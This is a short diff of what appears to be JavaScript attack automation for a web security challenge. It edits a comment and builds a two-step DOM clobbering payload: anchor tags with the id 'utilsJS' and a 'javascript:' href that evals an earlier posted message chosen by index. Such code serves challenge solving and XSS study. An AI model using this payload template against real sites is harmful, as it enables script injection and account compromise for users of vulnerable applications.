@@ -54,7 +54,8 @@
                 
                 console.log('[TWO-STEP-ATTACK] Step 2: Posting DOM Clobbering payload...');
                 
-                // Create DOM Clobbering payload that references the JavaScript payload at the correct index
+                // Create DOM Clobbering payload - fixed index
+                // The challenge has 2 default messages, so our JS payload will be at index currentMessageCount (which should be 2)
                 const dynamicDomClobberingPayload = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[${currentMessageCount}].split(':::')[1])"></a>`;
                 
                 // Post the DOM Clobbering payload
